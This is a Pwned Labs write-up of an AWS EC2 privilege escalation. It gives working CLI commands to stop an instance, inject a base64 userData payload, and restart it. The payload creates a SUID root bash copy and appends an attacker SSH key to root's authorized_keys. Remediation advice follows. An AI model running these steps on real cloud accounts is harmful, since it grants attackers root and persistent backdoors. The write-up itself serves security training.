# AWS EC2 UserData Privilege Escalation (Pwned Labs Write-Up)

**Lab Title:** Command Injection to EC2 UserData Privilege Escalation  
**Platform:** Pwned Labs  
**Target Architecture:** AWS EC2, IAM, Linux Host  
**Author:** Lethabo Sangweni  

---

## 1. Executive Summary

During this assessment, an initial access foothold was leveraged to inspect local AWS credentials and permissions. Enumeration revealed a misconfigured IAM policy granting sensitive EC2 management permissions (`ec2:ModifyInstanceAttribute`, `ec2:StopInstances`, `ec2:StartInstances`, and `ec2:DescribeInstances`).

By stopping the target EC2 instance, injecting a custom Base64-encoded bash payload into the instance's `UserData` attribute, and restarting the virtual machine, the script executed with local system `root` privileges upon boot via `cloud-init`. This resulted in local host root privilege escalation and persistent administrative access.

---

## 2. Technical Prerequisites & Required Permissions

This privilege escalation vector requires the security principal to hold the following set of IAM permissions on the target EC2 resource:

| IAM Permission | Action / Operational Impact |
| :--- | :--- |
| `ec2:DescribeInstances` | Enumerate target instance IDs, state, public/private IP addresses, and attached IAM roles. |
| `ec2:StopInstances` | Shut down the targeted EC2 instance (mandatory step, as `UserData` cannot be modified while running). |
| `ec2:ModifyInstanceAttribute` | Modify the Base64-encoded `userData` attribute to inject arbitrary commands. |
| `ec2:StartInstances` | Boot the instance to trigger automated execution of the `cloud-init` payload. |

---

## 3. Attack Execution Walkthrough

### Phase 1: Reconnaissance & Target Identification

From the compromised initial foothold session, identify the target instance ID using the AWS Instance Metadata Service (IMDS) or the AWS CLI:

```bash
# Retrieve current Instance ID via IMDS
INSTANCE_ID=$(curl -s [http://169.254.169.254/latest/meta-data/instance-id](http://169.254.169.254/latest/meta-data/instance-id))
echo "Target Instance ID: $INSTANCE_ID"
<img width="962" height="921" alt="website" src="https://github.com/user-attachments/assets/9a8d2e56-f5f6-4bc4-8579-5517293aefde" />
# Verify IAM permissions against EC2
aws ec2 describe-instances \
    --instance-ids $INSTANCE_ID \
    --query "Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn]"
Phase 2: Weaponization (Payload Creation)Draft a script that grants SUID administrative privilege to /bin/bash or creates an elevated backdoor user.Bashcat << 'EOF' > malicious_userdata.sh

#!/bin/bash
<img width="962" height="999" alt="UserPolicies" src="https://github.com/user-attachments/assets/e7c7f4ec-87ed-419f-b3f7-6929d753e362" />

# Pwned Labs EC2 UserData Privilege Escalation Payload

# Copy standard shell and assign SUID bit for root access
cp /bin/bash /tmp/rootbash
chmod xs /tmp/rootbash
chmod 4755 /tmp/rootbash

# Optional: Add persistence key to root authorized_keys
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@pwnedlabs" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
EOF

# Encode payload to Base64 (required by EC2 API)
USERDATA_B64=$(base64 -w 0 malicious_userdata.sh)
Phase 3: Exploitation & Instance ManipulationOperational Note: Stopping a target instance interrupts service. On live client engagements, coordinate maintenance windows before running intrusive actions.Bash# 1. Stop the target EC2 instance
aws ec2 stop-instances --instance-ids $INSTANCE_ID

# 2. Wait until the instance reaches 'stopped' state
aws ec2 wait instance-stopped --instance-ids $INSTANCE_ID

# 3. Inject the Base64 UserData payload
aws ec2 modify-instance-attribute \
    --instance-id $INSTANCE_ID \
    --attribute userData \
    --value "$USERDATA_B64"

# 4. Restart the instance to trigger cloud-init execution as root
aws ec2 start-instances --instance-ids $INSTANCE_ID

# 5. Wait for instance boot completion
aws ec2 wait instance-running --instance-ids $INSTANCE_ID
Phase 4: Privilege Escalation VerificationLog back into the SSH/shell context once the server finishes booting and verify root access via the generated SUID binary:  Bash# Execute the SUID binary with preserved privileges
/tmp/rootbash -p
<img width="962" height="1072" alt="flag" src="https://github.com/user-attachments/assets/42ecf94d-16a5-4ad9-abd4-61109485d917" />


# Confirm elevated effective user ID (euid=0)
id
4. Key Takeaways & RemediationEnforce Least Privilege: Never pair ec2:ModifyInstanceAttribute with ec2:StopInstances and ec2:StartInstances for non-administrative deployment roles.Restrict Attribute Modification: If ec2:ModifyInstanceAttribute is required, utilize IAM Condition Keys (or Service Control Policies) to restrict modification actions strictly to safe attributes (e.g., disable modification of userData).CloudTrail Alerting: Configure real-time SOC alerting for ModifyInstanceAttribute API calls targeting the userData attribute, especially when immediately preceded by a StopInstances API event.
